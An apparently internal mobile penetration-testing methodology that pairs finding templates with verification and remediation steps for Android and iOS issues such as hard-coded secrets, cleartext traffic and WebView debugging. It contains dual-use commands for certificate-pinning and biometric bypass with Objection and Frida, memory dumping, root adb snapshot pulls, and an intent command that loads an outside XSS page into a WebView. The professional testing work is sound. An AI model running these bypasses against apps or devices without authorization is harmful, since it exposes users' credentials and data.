tasks.name: Confirm access works WITH using Burp
tasks.instructions:
Goal: HTTPS interception

If this step fails - there are two potential causes:

1. Proxy avoidance. The application is ignoring system proxy settings. This is particularly relevant on Android, but is possible on both iOS and Android.

2. Certificate pinning. The application will only accept a pre-defined server certificate.

Solutions for proxy avoidance:

1. Use DNS Chef and DNS settings on the device to redirect traffic to an invisible proxy listener on your Mac / testing machine.

2. Watch traffic in wireshark to ensure unusual ports aren't in play. eg: port 4443.

Solutions for certificate pinning:

1. iOS - SSL kill switch.

2. Objection - certificate pinning bypass.

3. Frida - certificate pinning bypass scripts.

4. On non-rooted / non-JB phones - objection gadget.

5. Binary modifications - apktool / Hopper

This requires either:

1. Using a jailbroken or rooted device

2. Embedding and connecting to the Frida gadget into the application binary using Objection

3. Using an Android device with an unlocked bootloader, and then booting into a custom recovery like TWRP to access the app data.

Other more time consuming options:

* Embedding a RAT into the binary

* Finding a vulnerability that gives code execution specific to the application. This is rare and time consuming to find, but it is theoretically possible even on non-rooted / JB devices.

findingTemplate.name: Hard-coded Credentials - Android - Mobile Application Binary
findingTemplate.description: The application stores sensitive credentials within client-side code installed on the device. The installable client-side code is referred to as the mobile application binary and is distributed as an APK file on Android. The contents of these files are readable by any attacker with access to the distribution platform, which, for public applications, is the Google Play Store.
findingTemplate.businessImpact: A malicious user or attacker could gain access to the disclosed credentials and use them to then access the corresponding application. The impact would depend on the sensitivity of the data stored or the functionality provided by the application. The confidentiality and integrity of stored data could be compromised, or the attacker could leverage the provided access to further attack the application, its users, or other systems.
findingTemplate.verificationInstructions:
If the data stored in the binary consists of credentials to any web server, verify if you can login using those credentials. If login is successful or not successful, add a note stating login was successful/not successful.

If credentials cannot be used to login to any web server and consists of credentials used locally on the mobile application, downgrade this finding to a low.

Using MobSF:

1. Log into MobSF:

  • MobSF link: https://mobsf.netspi.com/

  • Credentials: NetSPI Passwords

2. Upload and Analyze APK:

  • Upload the APK file for analysis.

3. View Decompiled Contents:

  • Once the analysis is finished, view the Static Report.

4. Check the Possible Hardcoded Secrets:

Option A (App Information Section):

  1. Find the "Possible Hardcoded Secrets" in the Static Report's "App Information" section.

  2. Review the section for instances of legitimate exposed credentials.

Option B (Decompiled Code Section):

  1. Locate and click "View AndroidManifest.xml" in the Static Report's "Decompiled Code" section.

  2. Look for instances of strings such as "API_KEY".

Using Apktool:

1. Install Apktool: 

brew install apktool

2. Decompile APK with Apktool:

apktool d your_app.apk

(This command will decompile the APK and place its contents into the current directory.)

3. Navigate to the Decompiled APK:

  • Search for the AndroidManifest.xml file within the decompiled APK (typically in res or manifest directory).

4. Inspect AndroidManifest.xml:

Option A (Text Editor):

  1. Open the file in a text editor.

  2. Find any uses of sensitive tags, such as “API_KEY.”

  3. Search for other exposed credentials

Option B (Command Line):

  1. Use cat AndroidManifest.xml | grep 'API_KEY' command.

  2. Confirm that no credentials are exposed.

  3. Search all directories for potential exposures of credentials with the command:

    • grep -ri ‘password’ .
    • grep -ri ‘secret’ .
    • etc…

Note that this method will produce a large number of false positives.

Using JADX:

1. Install JADX:

brew install jadx.

2. Decompile the APK:

 jadx -d /path/to/output/directory /path/to/your/app.apk.

3. Navigate to the Decompiled APK:

  • Locate the AndroidManifest.xml file within the decompiled APK (usually in the res or manifest directory).

4. Inspect AndroidManifest.xml:

Option A (Text Editor):

  1. Open the file in a text editor.

  2. Find any uses of sensitive tags, such as “API_KEY.”

  3. Search for other exposed credentials

Option B (Command Line):

  1. Navigate to the decompiled APK directory using the Command Line Interface (CLI)

  2. Confirm that no credentials are exposed.

  3. Search all directories for potential exposures of credentials with the command:

    • grep -ri ‘password’ .
    • grep -ri ‘secret’ .
    • etc…

Note that this method will produce a large number of false positives.

Additional Notes:

Always cross-verify information obtained across multiple sections of the decompiled code to ensure accuracy.

Using Trufflehog:

1. Install Trufflehog:

brew install trufflehog

2. Decompile the APK:

 jadx -d /path/to/output/directory /path/to/your/app.apk.

3. Run Trufflehog on the decompiled files:

trufflehog filesystem path/to/file1.txt path/to/file2.txt path/to/dir
findingTemplate.remediationInstructions: Avoid embedding credentials to applications within the installable component of mobile applications. Ensure that Production build pipelines remove any debugging or test code that includes hard-coded credentials.

tasks.name: API Key Disclosure - Mobile Application Binary
tasks.instructions:
List out any concerning looking API keys in the binary. This is an Informational finding by default.

Note that "client_id" and "client_secret" should use the hardcoded credentials finding, instead of this one.

If you are sure that the API key should not be included in the mobile application code, raise the severity of this finding.

* Info severity - API keys of unknown utility or little benefit to an attacker.

* Low severity - Some utility to an attacker, but unlikely to be abused or middling effect.

* High severity - sensitive API key like a Google Cloud key with significant access.

For API keys that should be embedded, but are overprovisioned - use a separate MFLAC type of finding for that.

Eg:

* Firebase - Unauthorized Access to Cloud Firestore

* Firebase - Unauthorized Access to Firebase Storage

=====================

Trufflehog:

https://github.com/trufflesecurity/trufflehog

Review these sites

https://github.com/streaak/keyhacks

https://gitlab.com/dee-see/notkeyhacks

findingTemplate.name: API Key Disclosure - Mobile Application Binary
findingTemplate.description: The application stores sensitive API keys within client-side code installed on the device. The installable client-side code is referred to as the mobile application binary and is distributed as an APK file on Android and as an IPA file on iOS. The contents of these files are readable by any attacker with access to the distribution platform, which, for public applications, is the Google Play Store and Apple App Store.
findingTemplate.businessImpact: A malicious user or attacker could gain access to the disclosed API key and use it to directly interact with the API which the key grants access to. The impact would depend on the sensitivity of the data stored or the functionality provided by the API. The confidentiality and integrity of stored data could be compromised, or the the attacker could leverage the provided access to further attack the application, its users, or other systems.
findingTemplate.verificationInstructions:
Note - API keys that only act as an anonymous scanning defense should not be called out as a finding. This is considered best practice for mobile applications.

Examples of API key Disclosure include which also need to be reported:

  • Google Maps API Key -- Separate finding can be added if applicable:

    • Finding: "Weak Configuration - Lack of Google Maps API Key Restrictions"

  • FireBase API Key restrictions

Comprehensive list of API keys and exploits. (Report as a low if any of the API key are disclosed and you can perform any exploits successfully)

https://github.com/streaak/keyhacks
findingTemplate.remediationInstructions: Do not embed sensitive API keys directly in the installable component of mobile applications. If possible, avoid providing sensitive API keys to mobile applications and instead manage client-side access to server-side functionality through authenticated user sessions. If API keys are needed, ensure they are provided only after authentication and either stored securely or kept only in memory.

tasks.name: Information Disclosure - Mobile Application Binary
tasks.instructions: This is a catch-all finding for situations not covered by the other two more-common findings. It is intended to cover the situation where corporate secrets or customer information is accidentally embedded and exposed in a mobile application binary.

findingTemplate.name: Information Disclosure - Mobile Application Binary
findingTemplate.description: The application stores sensitive information within client-side code installed on the device. The installable client-side code is referred to as the mobile application binary and is distributed as an APK file on Android and as an IPA file on iOS. The contents of these files are readable by any attacker with access to the distribution platform, which, for public applications, is the Google Play Store and Apple App Store.
findingTemplate.businessImpact: A malicious user or attacker could gain access to the disclosed information. The impact would depend on the sensitivity of the information itself. Depending on how this information could be used, the confidentiality and integrity of stored data could be compromised, or the attacker could leverage the provided access to further attack the application, its users, or other systems.
findingTemplate.verificationInstructions:
Note that two other versions of this finding exist and those situations are more common

Other findings:

  • Hard-coded Credentials - Mobile Application Binary

  • API Key Disclosure - Mobile Application Binary

Use those findings instead of this one, if appropriate.

Direct binary review

If the data stored in the binary is very sensitive, like people's SSNs or credit card numbers, and the binary is in the App Stores, then increase the severity of this finding to Medium or High. This finding is Low by default in case the data is borderline between "sensitive" and "we're not sure if this is actually important/sensitive."

iOS:

strings appBinary | grep "https"

Android:

use apktool and dex2jar, jdgui to run new jar. Search for strings in the decompiled files.

MobSF

MobSF extract strings and URLs from binaries. Review for anything that looks different.
findingTemplate.remediationInstructions: Avoid embedding sensitive information within the installable component of mobile applications. Additionally, configure the application's build scripts to remove unintended information prior to release. Such information could include: sensitive business information, usernames from the build server, alternative application environments, sample data, and/or other application-specific information.

findingTemplate.name: Weak Configuration - Android - Low Minimum SDK Version
findingTemplate.description: The Android application specifies a low minimum SDK version. This allows the application to run on a device using a version of the Android platform that is not officially supported.
findingTemplate.businessImpact: Enabling the application to run on unsupported versions of the Android platform increases the risk of potential exploitation. Older SDK versions lack the latest security updates, patches, and advanced security features, exposing the application to known vulnerabilities.
findingTemplate.verificationInstructions:
Check https://endoflife.date/android to see if the version is out of date.

1. Using aapt (Android Asset Packaging Tool), extract the minimum SDK version supported from the APK. Observe that the minimum SDK version is set to an unsupported version of Android that no longer receives security updates.

Command:

aapt2 dump badging app.apk | grep -i "SDKversion"

Output:

package: name='com.example.app' versionCode='4321' versionName='1.2.3' platformBuildVersionName='12' platformBuildVersionCode='34' compileSdkVersion='34' compileSdkVersionCodename='12'
sdkVersion:'21'
targetSdkVersion:'34'
findingTemplate.remediationInstructions: Set the minSdkVersion only to allow supported Android versions. This will ensure that the device the application is installed on is not using a potentially vulnerable version of the operating system. Refer to the reference link to determine which Android versions are currently supported.

findingTemplate.verificationInstructions:
Using MobSF:

1. Log into MobSF:

  • MobSF link: https://mobsf.netspi.com/

  • Credentials: NetSPI Passwords

2. Upload and Analyze IPA:

  • Upload the IPA file for analysis.

3. View Decompiled Contents:

  • Once the analysis is finished, view the Static Report.

4. Check the Min OS Version:

Option A (App Information Section):

  1. Find the "Min OS Version" in the Static Report's "App Information" section.

  2. Confirm the value is set at 15 or above.

Option B (Decompiled Code Section):

  1. Locate and click "View Info.plist" in the Static Report's "Decompiled Assets" section.

  2. Look for the MinimumOSVersion in the Info.plist file.

  3. Locate the MinimumOSVersion attribute.

  4. Confirm the value is set at 15 or above.

Converting the IPA file to ZIP:

Option A (Using Text Editor):

1. Rename the IPA file to ZIP:

  • Change the file extension from .ipa to .zip. For example, if your file is named YourApp.ipa, rename it to YourApp.zip.

2. Extract the ZIP file:

  • Extract the contents of the ZIP file. This will give you a folder containing various files and folders related to the iOS application.

Note: Consultants can skip this step if using a text editor that supports viewing files within ZIP archives.

3. Locate the info.plist file:

  • Locate the Payload folder within the extracted content. Inside the Payload folder, you should see a file with a .app extension. Inside the .app folder, locate the Info.plist file. Open the Info.plist file using a code editor like Visual Studio Code, Xcode, or a simple text editor like Notepad or TextEdit.

4. Find and check minimumOSVersion:

  • Search the Info.plist file for the minimumOSVersion and verify that it is 15 or above.

Option B (Command Line):

1. Rename the IPA file to ZIP:

  • Open Terminal on your Mac.

  • Navigate to the directory where your IPA file is located.

  • Use the following command to rename the file extension from .ipa to .zip:

mv YourApp.ipa YourApp.zip

2. Extract the ZIP file:

  • Extract the contents of the ZIP file using the following command:

unzip YourApp.zip -d YourAppFolder

3. Navigate to the Payload folder:

  • Use the following command to navigate to the Payload folder:

cd YourAppFolder/Payload

4. Check minimumOSVersion:

  • Use a command line tool, such as cat or grep, to inspect the contents of the Info.plist file. For example:

cat YourApp.app/Info.plist | grep minimumOSVersion

tasks.name: Binary analysis - Android Cleartext Network Traffic Allowed

findingTemplate.name: Weak Configuration - Cleartext Network Traffic Allowed - Android
findingTemplate.description: The application contained settings that disabled the enforcement of secure network-layer encryption and allowed for cleartext (unencrypted) communications. This finding documents an insecure security setting in client-side configuration files. Specifically, this setting is configured in the Android application's network security policy file, network_security_config.xml. The identified settings do not confirm that the application transmits data insecurely, only that the protections against this outcome have been disabled.
findingTemplate.businessImpact: Application developers could inadvertently expose application data over insecure network communication channels. This represents a machine-in-the-middle risk where an attacker positioned between the client and server could potentially observe and manipulate the application’s network traffic. If exploited, the confidentiality and integrity of application data would be put at risk.
findingTemplate.verificationInstructions:
1. Decompile the APK file.

2. Browse to 'res/xml' folder within the decompiled apk file and open network_security_config.xml file. Observe that the setting for "cleartextTrafficPermitted" is set to true.

network_security_config.xml:

<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">10.0.2.2</domain>
    </domain-config>
</network-security-config>
findingTemplate.remediationInstructions: If a network security configuration file is used, ensure that that the attribute “cleartextTrafficPermitted” is unset or is set to “false” in the “base-config” section or for any specific domains. Android is secure by default concerning this setting, so an application that contains no network security configuration file is also secure. Removing the network security configuration file would be a valid remediation for this issue if possible.

findingTemplate.name: Weak Configuration - iOS - Cleartext Network Traffic Allowed
findingTemplate.description: The application contained settings that disabled the enforcement of secure network-layer encryption and allowed for cleartext (unencrypted) communications. This finding documents an insecure security setting in client-side configuration files. Specifically, this setting is configured in the application's App Transport Security (ATS) policy. This is contained within the Info.plist file that is embedded within the application package. ATS normally enforces secure connections between an app and its back-end server. The identified settings do not confirm that the application transmits data insecurely, only that the protections against this outcome have been disabled.
findingTemplate.businessImpact: Application developers could inadvertently expose application data over insecure network communication channels. This represents a machine-in-the-middle risk where an attacker positioned between the client and server could potentially observe and manipulate the application’s network traffic. If exploited, the confidentiality and integrity of application data would be put at risk.
findingTemplate.verificationInstructions:
Note: this finding replaces "Weak Configuration - App Transport Security Settings - iOS [Deprecated]"

Extract the application's Info.plist, using MobSF or another utility. Look for "NSAppTransportSecurity" contents - if specific domains are listed with "NSThirdPartyExceptionAllowsInsecureHTTPLoads", or "NSAllowsArbitraryLoads" is set to true, this is a finding.

If an HTTP connection is used, add the 'Cleartext Protocol - HTTP' finding' along with this finding and escalate this finding to a low.

Note: iOS 9 onwards ATS was introduced. Refer to this article for more details.

https://medium.com/@thaoth58/fix-app-transport-security-ats-blocks-network-connection-in-ios-761e555d5b20
findingTemplate.remediationInstructions: The NSAllowsArbitraryLoads flag is implicitly false without configuration changes in the App Transport Security Settings (ATS). If possible, remove the custom ATS configuration or avoid using the NSAllowsArbitraryLoads flag in the Info.plist file.

findingTemplate.name: Missing Local Authentication - Mobile Application
findingTemplate.description: The application requires users to authenticate on first use of the mobile application, but subsequent uses do not require a local authentication event before granting access. In a lost-device scenario, this could put user and application data at risk. An attacker who acquired a user's unlocked device could get immediate access to the application's functionality and data by opening and using the application in the context of the targeted user.
findingTemplate.businessImpact:
An attacker who exploited this vulnerability could gain unauthorized access to the application's functionality in the context of the targeted user. This may lead to the compromise of the confidentiality and integrity of the affected system and its associated resources.

In this scenario, an attacker would need to successfully acquire a target user's device in an unlocked state or have the means to unlock it.
findingTemplate.verificationInstructions:
Static Analysis:

Check for the use of the local authentication framework. The following otool command will list all shared dynamic libraries:

otool -L <AppName>.app/<AppName>

You can grep the results and look for the following lines:

/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security

If either of these lines are in use, local authentication may be in use. Note it is possible only Security.framework will be in use. LocalAuthentication.framework depends on Security.framework.

Dynamic Analysis:

When biometrics can be used to secure sessions, enable it and attempt to use Objection's built-in method to bypass it:

ios ui biometrics_bypass

How to determine the severity for this finding:

Medium

  • Long-lived sessions (greater than 24 hour access token) or refresh tokens is used, but it isn't protected with local authentication. Rebooting the phone and closing the app doesn't affect anything. The app always automatically authenticates the user at startup.

  • Offline functionality. If the app has intentional offline functionality (crypto wallet, password manager, etc.), and fails one of the above checks, then this finding applies at a Medium severity.

Low

  • A refresh token is protected, but the short-lived authentication token/session token is not. For example, the app implements 1-hour server-side sessions, but a refresh token is used. This refresh token is protected with proper flags ('user presence or 'biometryCurrentSet').

  • Include a note that this is "weak local authentication" rather than "missing local authentication." If possible, rename the title to match.
findingTemplate.remediationInstructions:
Ensure that both client and server-side authentication events are required and implemented in accordance with platform and protocol-specific best practices.

For local authentication on iOS, use the keychain to store an authentication token. Apply strong protections on the keychain entry, including an accessibility attribute such as whenpasscodesetthisdeviceonly and an access control constraint such as UserPresence or biometryCurrentSet. Without access control flags, no authentication is required to access keychain entries. Keychain items set with restrictive access control flags however may be inaccessible to attackers even on a compromised device.

On Android, use the keystore to store a cryptographic key that operates on an encrypted and locally stored authentication token. Make sure that the unlocked key is used during the application flow. For example, the key may be used to decrypt local storage or a message received from a remote endpoint. If the application simply checks whether the user has unlocked the key or not, the application may still be vulnerable to a local authentication bypass.

findingTemplate.name: Authentication Bypass - Biometric
findingTemplate.description: The application insecurely implements a local mobile biometric authentication check.  It is possible to bypass the local authentication framework to gain access as an authenticated identity without sufficiently proving control of that identity.
findingTemplate.businessImpact: An attacker who exploited this vulnerability could gain unauthorized access to the application's functionality in the context of the targeted user.  This may lead to the compromise of the confidentiality and integrity of the affected system and its associated resources.
findingTemplate.verificationInstructions:
Instrument the target application with Frida and Objection. 

On iOS:

  1. Use Objection to attempt to override a false response from the Local Authentication Context (LAContext) API with the command “ios ui biometrics_bypass”. 

  2. Tap “Cancel” at The fingerprint authentication screen and observe whether authentication proceeds normally.

On Android:

  1. run the two Frida scripts linked from the OWASP Mobile Security Testing Guide. 

An example Frida command to do this on a USB attached phone is: 

frida -U -l ./android_bio_bypass_2.js -f $targetapp

OWASP iOS and Android Mobile Security Testing Guide (MSTG) references.  See the “dynamic analysis” section.

https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06f-testing-local-authentication

https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05f-testing-local-authentication
findingTemplate.remediationInstructions:
Do not link biometric authentication to an event bound process, eg: an API that simply returns 'true' or 'false'. Instead, use the keychain or keystore features provided by mobile operating systems.

For local authentication on iOS, use the keychain to store an authentication token. Apply strong protections on the keychain entry, including an accessibility attribute such as whenpasscodesetthisdeviceonly and the access control constraint biometryCurrentSet. Without access control flags, no authentication is required to access keychain entries. Keychain items set with restrictive access control flags however may be inaccessible to attackers even on a compromised device.

On Android, use the keystore to store a cryptographic key that operates on an encrypted and locally stored authentication token. Make sure that the unlocked key is used during the application flow. For example, the key may be used to decrypt local storage or a message received from a remote endpoint. If the application simply checks whether the user has unlocked the key or not, the application may still be vulnerable to a local authentication bypass.

Additionally, keystore and keychain objects should be invalidated when the user removes or enrolls a new biometric.

findingTemplate.name: Information Disclosure - Mobile Application Storage
findingTemplate.description: The application stores sensitive information within its application files. These files reside on the target device, creating a potential for disclosure.
findingTemplate.businessImpact: A malicious user or attacker accessing the device could compromise the confidentiality of the sensitive information. Depending on the nature of the information, the attacker could leverage the information to further attack the application, other users, or other systems.
findingTemplate.verificationInstructions:
Download a copy of the application sandbox and application bundle directory. Search all files for sensitive information that is handled by the application.

When determining the severity of this finding, identify the value of the data being stored locally:

Medium severity:

Intrinsically valuable information such as credit card numbers, US social security numbers, PII, patient health data

Low severity:

Unencrypted post-authentication data, HTTP request/response logs

Informational severity:

Ineffectively encrypted post-authentication data

If the locally stored content is not sensitive, then consider marking as a false positive.

Additionally, if the locally stored data contains Refresh tokens, Access tokens, passwords, or similar data, then the finding, "Insecure Credential Storage - Mobile Application" should be used instead of this one.

Using MobSF:

1. Log into MobSF:

  • MobSF link: https://mobsf.netspi.com/

  • Credentials: NetSPI Passwords

2. Upload and Analyze APK:

  • Upload the APK file for analysis.

3. View Decompiled Contents:

  • Once the analysis is finished, view the Static Report.

4. Check the for the 'allowBackup' parameter to be set to true:

  1. Locate and click "View AndroidManifest.xml" in the Static Report's "Decompiled Code" section.

  2. Look for the android:allowBackup=true in the AndroidManifest.xml file.
findingTemplate.remediationInstructions:
Whenever possible, only store sensitive information in memory and only for the length of the active session. If sensitive information is required longer than a given session, store it server-side. Avoid storing user credentials on the device. Instead, store an authentication token, such as an OAuth 2.0 refresh token. The refresh token has no intrinsic value, should expire within a configured time window, and should be able to be revoked by the user and application administrators.

Only store sensitive information on the device when there is an explicit business need to do so and delete the information as soon as there is no longer a need to retain it.

If sensitive information must be stored on the device, use encryption to protect the stored information. Store encryption keys using the most secure means available on the device. On iOS devices, use strong ACL rules on keychain entries, on Android, use keystore settings that utilize the setUserAuthenticationParameters method and the AUTH_BIOMETRIC_STRONG requirement.

findingTemplate.name: Information Disclosure - Mobile Device Memory
findingTemplate.description: The application retains unencrypted sensitive information in memory. This information resides in memory after the apparent need for the information has ended.
findingTemplate.businessImpact: An attacker may be able to gain unauthorized access to sensitive information by directly accessing the primary memory of the affected application. Additionally, some of the recovered data could be used in future attacks.
findingTemplate.verificationInstructions:
For Android and iOS:

1. Download fridump (https://github.com/Nightbringer21/fridump)

2. Make sure Frida and Frida-tools are installed.

3. Run frida-ps -Ua command and note down the application name.

4. Browse through the application to locations that contain sensitive information. (SSN, CC, Passwords)

5. Click logout. (Do not crash or force close the application)

6. Run "python fridump.py -U -s "Appname".

7. Browse to strings.txt file created by fridump and search for sensitive information noted in step 4.

Alternative Method: (The objection method is sometimes slow or will crash the application)

1. Browse through the application to locations that contain sensitive information. (SSN, CC, Passwords)

2. Run "Objection -g appname" explore.

3. Run "Memory Dump filename"

4. String through the memory dump file. "Strings.exe filename".

Report only for sensitive information like SSN, Password, and Credit Card. Do not report for username, email, Authenticated HTTP Request/Responses, or user-specific information.
findingTemplate.remediationInstructions: Only retain objects containing sensitive information in memory while there is a business need. When possible, securely delete sensitive information from memory or encrypt objects in memory using vendor-supplied best practices.

findingTemplate.name: Weak Configuration - SSL/TLS - Lack of Certificate Validation
findingTemplate.description: The application utilizes TLS to encrypt client-to-server communications, but it fails to securely validate the certificate trust chain presented by the server. If the certificate signature is not verified all the way up to a trusted certificate authority, it is possible to issue a bogus certificate and have it accepted by the application. An attacker could exploit this to capture all transmitted communications and receive it as unencrypted clear-text data.
findingTemplate.businessImpact: If the SSL/TLS library is configured to disable verification of the certificate trust chain, it is possible to cause the application to accept a forged certificate. This can allow an attacker to intercept the client requests, spoof the server certificate, and perform an active Man-in-the-Middle attack, even over HTTPS. This would give an attacker complete access to the application's communication requests and responses. The attacker could read any sensitive information and modify any data, including user credentials.
findingTemplate.verificationInstructions:
iOS:

  1. Configure an Android device to intercept HTTP traffic with a proxy, such as Burp Suite.

  2. Having Burp set up as a proxy, make sure that there is no certificate added to the trust store (Settings -> General -> Profiles) and that tools like SSL Kill Switch are deactivated.

  3. Launch the application and check if you can see the traffic in Burp. Notice the the traffic is proxied, which means that there is no certificate validation performed at all.

Android:

[Work in Progress]

Self-signed certificate:

  1. Configure an Android device to intercept HTTP traffic with a proxy, such as Burp Suite.

  2. In Burp Suite, go to the Proxy tab and select the Options tab.

  3. Go to the Proxy Listeners section, highlight your listener, and click Edit.

  4. Go to the Certificate tab, check Use a self-signed certificate, and click Ok.

  5. Run the application. Notice the HTTPS traffic in the Burp Suite Proxy History, which indicates the application is accepting self-signed certificates.

Accepting certificates with an untrusted CA:

  1. Configure an Android device to intercept HTTP traffic with a proxy, such as Burp Suite.

  2. In Burp Suite, go to the Proxy tab and select the Options tab.

  3. Go to the Proxy Listeners section, highlight your listener, and click Edit.

  4. Go to the Certificate tab, check Generate a CA-signed certificate with a specific hostname, and type in the backend server's hostname.

  5. Run the application. Notice the HTTPS traffic in the Burp Suite Proxy History, which indicates the application is accepting certificates with an untrusted CA.

Accepting incorrect hostnames:

  1. In Burp Suite, go to the Proxy tab and select the Options tab.

  2. Go to the Proxy Listeners section, highlight your listener, and click Edit.

  3. Go to the Certificate tab, check Generate a CA-signed certificate with a specific hostname, and type in an invalid hostname, e.g., example.org.

  4. Run the application. Notice the HTTPS traffic in the Burp Suite Proxy History, which indicates the application is accepting all hostnames.
findingTemplate.remediationInstructions: Properly implement all checks necessary to ensure the identity of entities involved in encrypted communications. Most coding platforms have secure TLS and HTTPS settings by default. Review the application's code to identify instances where certificate chain validation may have been disabled.

findingTemplate.name: Lack of Certificate Pinning
findingTemplate.description:
This test checks whether Certificate Pinning is enabled and used to further secure against two specific TLS certificate related threats. The first is a compromised Root CA and the second is the user being tricked into installing an attacker's Root CA on their device. Note that the first scenario is mitigated by Certificate Transparency protocol efforts and the second scenario does not apply by default to Android applications.

Note that Certificate Pinning has the additional effect of making analysis of application network traffic more difficult for potential attackers.
findingTemplate.businessImpact: If a Root CA was compromised and issued bogus certificates to threat actors, those threat actors could impersonate servers and intercept all network traffic between the server and users. At that point, data confidentiality and integrity would be at risk for the affected applications.
findingTemplate.verificationInstructions: Install the Burp Suite certificate to your iOS device, configure the iOS device to proxy traffic through Burp Suite, and then open the application and navigate around. If the application is functioning normally and traffic is being logged in Burp Suite's Proxy History, this is a finding, as it indicates the application will trust any arbitrary certificate.
findingTemplate.remediationInstructions: The best implementation for certificate pinning in Android is through Network Security Configuration (NSC), which is available since API 24. On iOS, similar functionality is available in the App Transport Security (ATS) functionality. See the references section below for more details on implementing these features.

findingTemplate.name: Information Disclosure - Android - Window Lacks FLAG_SECURE
findingTemplate.description: The Android application shows sensitive data in a Window without the FLAG_SECURE flag set. This flag can be applied to any Window, including the primary Window for the activity. When the FLAG_SECURE flag is set, content within the Window will not be displayed on a non-secure display or stored in a non-secured buffer. This includes non-secure external displays, screenshots, multi-tasking views, screencasting, and other screen capture functionality.
findingTemplate.businessImpact: When an Android application is closed without the FLAG_SECURE flag set, the content displayed on the screen may remain visible in the device's memory until other data overwrite it. If sensitive information was displayed at the time of closure, unauthorized users with physical access to the device may be able to retrieve this information using various techniques, such as screen capturing. This unauthorized access could occur even if the user is not logged into the application or does not have the necessary permissions to view the sensitive data.
findingTemplate.verificationInstructions:
1. Authenticate to the application as any user.

2. Navigate to the XYZ Page.

  • Screen page with sensitive data.

3. Press the Home button to send the app to the background.Observe that the view containing sensitive information is shown as the top view element.

  • Screenshot the app being sent to the background.

4. Use the adb commands shown below to pull the stored snapshot from the mobile device:

adb shell "su -c mkdir -p /sdcard/pulls/pull_1 2>&1" && \
adb shell "su -c cp -rf /data/system_ce/0/snapshots /sdcard/pulls/pull_1 2>&1" && \
adb -d pull /sdcard/pulls/pull_1/

5. Using any image viewing software, open the snapshot from the previous step. Observe the snapshot containing sensitive information is shown instead of a default image.

  • Screenshot of snapshot in image viewing software
findingTemplate.remediationInstructions:
For an application that supports Android API level 33 and below:

Set the FLAG_SECURE flag on any Window that contains sensitive data. This can be done by calling the following method from the Activity context:

getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);

Ensure the FLAG_SECURE flag is set on any UI elements displaying a child Window within the app.

Also, if any UI elements show a child window within the application, please ensure that the FLAG_SECURE flag is set for that UI element's window. This can be done by changing the UI element's code or by using a patching library such as cwac-security.

For an application that supports Android API level 33 and above:

Set the 'setRecentsScreenshotEnabled' flag to false. If set to false, the system should never take a screenshot of the activity to be used as a representation on a recent screen. By default, this value is true.

public void setRecentsScreenshotEnabled (boolean enabled)

tasks.name: WebView Security - Android - Webview Debugging Enabled

findingTemplate.name: WebView Debugging Enabled - Android - Mobile Application
findingTemplate.description:
The Android application enabled the 'setWebContentsDebuggingEnabled' configuration setting on its WebViews. This global configuration setting exposes the application to greater risk under specific attack scenarios. When the setting is enabled, attackers who gain access to a targeted user's device can connect to the WebView with web developer tools and remotely control all aspects of the WebView. Depending on the functionality available to the WebView and its configured security settings, the attacker could use this access to escalate privileges locally within the context of the application on the targeted user's device.

Note that WebView debugging is not affected by the state of the debuggable flag in the application's manifest.
findingTemplate.businessImpact: In a lost-device scenario, any locally stored data or sensitive business functionality available within the application could be at risk. Depending on how the application stores data locally on the device, this could include stored user credentials or access tokens. The availability of this attack vector alleviates the requirement of gaining root access to the targeted device in order to interact with the application with an enhanced level of access.
findingTemplate.verificationInstructions:
Static Analysis:

Step 1. Decompile the APK using a tool like JADX or jadx-gui.

Step 2. Search the decompiled code for the WebView Debugging Flag:

WebView.setWebContentsDebuggingEnabled(true);

Step 3a. If WebView.setWebContentsDebuggingEnabled(true); is found , report this vulnerability.

Step 3b. If the line is absent or set to false, debugging is disabled.

Dynamic Analysis:

Step 1. Connect the Android Device to Local Machine via USB.

Step 2. Open a terminal and run the following command to verify device connection:

adb devices

Step 3. Open Chrome on the local machine and navigate to chrome://inspect.

Step 4. Under "Remote Targets," check for a list of active WebViews.

  • If you see WebViews listed with the app’s package name, report this as a vulnerability (WebView debugging is enabled).

  • If no WebViews are listed, debugging is disabled.

Increase the severity to Medium if:

1. This finding has been confirmed in a release/production build, and

2. JavaScript can be used to exfiltrate files out of local storage and

3. Some of those files contact post-authentication or sensitive data such as refresh tokens, passwords, etc.
findingTemplate.exploitInstructions:
Exploit activities via following command.

Check for any intents configured within webviews.

1. Decompile the Android application using MobSF or Dex2jar.

2. Search for webview.loadUrl class within the decompiled Android application.

3. If an external intent is loaded via Webview, exploit using following command below.

adb.exe shell am start -n com.netspi.android/.SupportWebView –es parameter_name "https://net-spi.com/xss.html

Please refer to this link for additional exploitation ideas.

https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/webview-attacks
findingTemplate.remediationInstructions:
Do not enable WebView debugging in Release or Production builds. Either ensure the call to 'setWebContentsDebuggingEnabled' is removed or add a check on this function call to ensure it is only enabled in Debug builds. An example check that allows WebView debugging only in Debug builds is shown below:

if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))

{ WebView.setWebContentsDebuggingEnabled(true); }

findingTemplate.name: Weak Configuration - Lack of Google Maps API Key Restrictions
findingTemplate.description: The application discloses a Google Maps API key that works on multiple API categories (ex. Time Zone API, Elevation API, etc.). While there might be inherent controls enabled like referer checking set up in the corresponding Google API key configuration, consider making the Maps API key more granular in scoping by applying it to individual categories or only those needed.
findingTemplate.businessImpact: A Google Maps API key that is enabled on multiple API categories increases the potential for misuse by a third-party. This is especially relevant if the API key is tied to an unmonitored API category. There might be a lack of security controls across all categories, and a malicious user might be able to make many repeated API calls to increase the overall bill for the API key owner.
findingTemplate.verificationInstructions:
Verification Instructions:

Run the key through this tool: https://github.com/ozguralp/gmapsapiscanner

Be sure to add any required Referer headers or User-Agent.

If the key is not restricted to a single API category, call out this finding.

Reporting Instructions:

  1. Show the HTTP request on how the API key was discovered

  2. Run the tool mentioned above and copy the output indicating what is vulnerable.
findingTemplate.remediationInstructions:
Ensure each Google API key is tied to only one Google category. In addition, ensure controls recommended by Google per the referenced article (ex. Referer header checks) are used to prevent an individual from spamming the select API key.

For mobile applications that require authentication, a secure proxy server can be used to avoid exposing the API key to the client. This is discussed in the best practices link below.

Google API Key Best Practices:

findingTemplate.name: Weak Assembly Control - Insufficient Obfuscation
